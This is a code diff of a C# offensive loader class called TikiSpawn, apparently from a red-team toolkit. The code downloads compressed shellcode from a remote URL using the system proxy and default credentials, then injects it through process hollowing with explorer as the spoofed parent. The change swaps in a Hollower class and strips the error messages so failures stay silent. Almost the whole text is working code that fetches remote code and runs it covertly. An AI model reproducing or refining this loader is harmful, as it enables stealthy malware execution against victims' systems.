@@ -2,6 +2,7 @@
 using System.Net;
 using System.Diagnostics;
 using System.Runtime.InteropServices;
+
 using TikiLoader;
 
 [ComVisible(true)]
@@ -19,7 +20,7 @@ public class TikiSpawn
         client.Proxy = WebRequest.GetSystemWebProxy();
         client.Proxy.Credentials = CredentialCache.DefaultCredentials;
         string compressedEncodedShellcode = client.DownloadString(url);
-        return Loader.DecompressShellcode(Convert.FromBase64String(compressedEncodedShellcode));
+        return Generic.DecompressShellcode(Convert.FromBase64String(compressedEncodedShellcode));
     }
 
     private static int FindProcessPid(string process)
@@ -37,7 +38,6 @@ public class TikiSpawn
         }
 
         return pid;
-
     }
 
     private void Flame(string binary, string url)
@@ -45,21 +45,18 @@ public class TikiSpawn
         byte[] shellcode = GetShellcode(url);
         int ppid = FindProcessPid("explorer");
 
-        if (ppid == 0)
+        if (ppid != 0)
         {
-            Console.WriteLine("[x] Couldn't get Explorer PID");
+            try
+            {
+                var hollower = new Hollower();
+                hollower.Hollow(binary, shellcode, ppid);
+            }
+            catch { }
+        }
+        else
+        {
             Environment.Exit(1);
-        }
-
-        var ldr = new Loader();
-
-        try
-        {
-            ldr.Load(binary, shellcode, ppid);
-        }
-        catch (Exception e)
-        {
-            Console.WriteLine("[x] Something went wrong! " + e.Message);
         }
     }
 }
